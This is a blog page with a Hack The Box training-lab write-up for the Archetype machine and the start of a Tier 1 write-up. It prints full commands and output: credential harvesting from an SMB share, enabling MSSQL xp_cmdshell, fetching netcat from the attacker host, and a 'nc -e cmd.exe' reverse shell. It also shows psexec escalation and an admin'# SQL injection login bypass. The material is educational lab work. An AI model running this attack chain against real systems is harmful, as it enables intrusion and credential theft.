+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier2-Archetype</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-17 20:41:04 / 修改时间：20:43:33" itemprop="dateCreated datePublished" datetime="2026-05-17T20:41:04+08:00">2026-05-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>第二层级是“StartingPoint”中的最高层级，包含功能齐全的机器，需要用户串联多个攻击步骤才能成功入侵。用户必须进行彻底的枚举，获取初始立足点，然后逐步提升权限至 root 或系统级别。与之前的层级不同，第二层级中的每台机器都包含两个标志——一个用于用户，一个用于 root/系统——这模拟了真实的渗透测试场景，需要更全面的方法。</p>
+<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line"><span class="built_in">sudo</span> smbclient \\\\10.129.129.122\\backups</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">get prod.dtsConfig</span><br><span class="line">Password=M3g4c0rp123</span><br><span class="line"><span class="built_in">cd</span> /usr/share/doc/python3-impacket/examples/</span><br><span class="line">python mssqlclient.py -h</span><br><span class="line"><span class="built_in">sudo</span> python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">SELECT is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c pwd&#x27;</span></span><br><span class="line">C:\Windows\system32</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe</span><br><span class="line">ip a</span><br><span class="line">tun0: 10.10.14.92</span><br><span class="line"><span class="built_in">sudo</span> python -m http.server 80 </span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc64.exe -outfile nc64.exe&#x27;</span></span><br><span class="line">nc -nvlp 443</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc.exe -outfile nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; ls C:\Users\sql_svc\Downloads\nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;nc64.exe?raw=true&#x27;</span> nc2.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">C:\Users\sql_svc\Downloads&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;winPEASx64.exe?raw=true&#x27;</span> winPEASx64.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/winPEASx64.exe -outfile winPEASx64.exe&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br><span class="line">administrator MEGACORP_4dm1n!!</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.Which TCP port is hosting a database server? </p>
+<p>1433</p>
+<p>2.What is the name of the non-Administrative share available over SMB?</p>
+<p>backups</p>
+<p>3.What is the password identified in the file on the SMB share?</p>
+<p>M3g4c0rp123</p>
+<p>4.What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
+<p>mssqlclient.py</p>
+<p>5.What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
+<p>xp_cmdshell</p>
+<p>6.What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
+<p>WinPEAS</p>
+<p>7.What file contains the administrator’s password?</p>
+<p>ConsoleHost_history.txt</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>扩展存储过程 (Extended Stored Procedure): 在数据库里，”存储过程”就是一段提前写好的 SQL 代码。而”扩展存储过程”允许 MSSQL 数据库调用外部的动态链接库（DLL），这意味着数据库可以直接与底层的 Windows 操作系统进行交互。</p>
+<p>在现代的 MSSQL 版本（2005 之后）中，出于安全考虑，微软默认禁用了 xp_cmdshell。</p>
+<p>因此在实际的打靶或实战中，如果攻击者拥有极高的权限（如 SA），通常需要先执行几条特定的 SQL 语句把它重新开启，然后才能使用。开启命令通常如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 1. 允许修改高级配置</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- 2. 开启 xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure>
+<p>在github上下载的exe文件，如果不指定raw格式，则会下载整个文件，这是一个大的踩坑点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h2 id="详细记录"><a href="#详细记录" class="headerlink" title="详细记录"></a>详细记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 09:00 EDT</span><br><span class="line">Warning: 10.129.129.122 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.129.129.122</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49668/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line"></span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line">Password for [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        backups         Disk</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.129.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt; </span><br><span class="line"></span><br><span class="line">Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</span><br><span class="line"></span><br><span class="line">sudo python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt;</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; xp_cmdshell ‘net user’;</span><br><span class="line">ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; SELECT is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell &#x27;net user&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">User accounts for \\ARCHETYPE</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line"></span><br><span class="line">sql_svc                  WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line"># 稳定反向shell获取</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=true</span><br><span class="line">mv &#x27;nc64.exe?raw=true&#x27; nc2.exe</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;</span><br><span class="line">C:\Users\sql_svc\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">    PowerShell Settings</span><br><span class="line">    PowerShell v2 Version: 2.0</span><br><span class="line">    PowerShell v5 Version: 5.1.17763.1</span><br><span class="line">    PowerShell Core Version:</span><br><span class="line">    Transcription Settings:</span><br><span class="line">    Module Logging Settings:</span><br><span class="line">    Scriptblock Logging Settings:</span><br><span class="line">    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    PS history size: 79B</span><br><span class="line"></span><br><span class="line">Analyzing Windows Files Files (limit 70)</span><br><span class="line">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    C:\Users\Default\NTUSER.DAT</span><br><span class="line">    C:\Users\sql_svc\NTUSER.DAT</span><br><span class="line"></span><br><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line">cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br><span class="line"></span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          .</span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/17/2020  02:36 AM                79 ConsoleHost_history.txt</span><br><span class="line">               1 File(s)             79 bytes</span><br><span class="line">               2 Dir(s)  10,754,007,040 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;type ConsoleHost_history.txt</span><br><span class="line">type ConsoleHost_history.txt</span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.129.95.187.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file hvfcrhtO.exe</span><br><span class="line">[*] Opening SVCManager on 10.129.95.187.....</span><br><span class="line">[*] Creating service aWaI on 10.129.95.187.....</span><br><span class="line">[*] Starting service aWaI.....</span><br><span class="line">[!] Press help for extra shell commands                                                                                                                        Microsoft Windows [Version 10.0.17763.2061]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir                                                                                                                             Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          .</span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/25/2020  07:36 AM                32 root.txt</span><br><span class="line">               1 File(s)             32 bytes</span><br><span class="line">               2 Dir(s)  10,328,911,872 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier1/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-17 20:37:10 / 修改时间：20:40:19" itemprop="dateCreated datePublished" datetime="2026-05-17T20:37:10+08:00">2026-05-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Tier1引入基础的漏洞利用技术略微增加了难度。</p>
+<h1 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h1><p>1.What does the acronym SQL stand for?</p>
+<p>SQL 是什么的缩写？</p>
+<p> Structured Query Language  </p>
+<p>2.What is one of the most common type of SQL vulnerabilities?</p>
+<p>最常见的 SQL 漏洞类型之一是什么？</p>
+<p>sql injection</p>
+<p>3.What is the 2021 OWASP Top 10 classification for this vulnerability?</p>
+<p>该漏洞在 2021 年 OWASP Top 10 中的分类是什么？</p>
+<p>A03:2021-Injection</p>
+<p>4.What does Nmap report as the service and version that are running on port 80 of the target?</p>
+<p>Nmap 报告称，目标主机 80 端口上运行的服务和版本是什么？</p>
+<p>Apache httpd 2.4.38 ((Debian))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -p 80 -sCV 10.129.125.97</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 04:15 EDT</span><br><span class="line">Nmap scan report for localhost (10.129.125.97)</span><br><span class="line">Host is up (1.9s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 171.25 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>5.What is the standard port used for the HTTPS protocol?</p>
+<p>HTTPS 协议的标准端口是什么？</p>
+<p>443</p>
+<p>6.What is a folder called in web-application terminology?</p>
+<p>在 Web 应用程序术语中，文件夹叫什么？</p>
+<p>directory</p>
+<p>7.What is the HTTP response code that is returned for Not Found errors?</p>
+<p>对于 Not Found ”错误，HTTP 响应代码是什么？</p>
+<p>404</p>
+<p>8.Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?</p>
+<p>Gobuster 是一款用于暴力破解 Web 服务器目录的工具。在使用 Gobuster 时，我们应该使用哪个参数来指定我们要查找的是目录而不是子域名？</p>
+<p>dir</p>
+<p>9.What single character can be used to comment out the rest of a line in MySQL?</p>
+<p>在 MySQL 中，可以用哪个字符注释掉一行剩余的内容？</p>
+<p>#</p>
+<p>10.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p>
+<p>如果用户输入处理不当，可能会被解读为评论。假设用户在不知道密码的情况下，使用评论以管理员身份登录，返回的网页上的第一个单词是什么？</p>
+<p>congratulations</p>
+<p>11.we can use credentials as admin’# and password can be anything</p>
